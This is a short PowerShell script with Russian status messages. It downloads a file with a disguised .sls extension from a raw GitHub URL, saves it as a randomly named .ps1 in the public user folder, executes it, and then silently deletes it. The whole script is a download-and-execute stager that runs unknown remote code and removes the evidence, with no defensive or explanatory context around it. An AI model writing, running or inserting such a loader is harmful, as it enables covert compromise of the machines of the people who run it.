$url = "https://raw.githubusercontent.com/robotinsideus12/cl/refs/heads/main/new.sls"
$tempFile = "C:\Users\Public\temp_$(Get-Random).ps1"

try {

    $client = New-Object System.Net.WebClient
    $client.DownloadFile($url, $tempFile)
    
    if (Test-Path $tempFile) {
        & $tempFile
        Write-Host "Скрипт выполнен успешно"
    }
} catch {
    Write-Error "Ошибка: $($_.Exception.Message)"
} finally {
    if (Test-Path $tempFile) {
        Remove-Item $tempFile -ErrorAction SilentlyContinue
    }
}
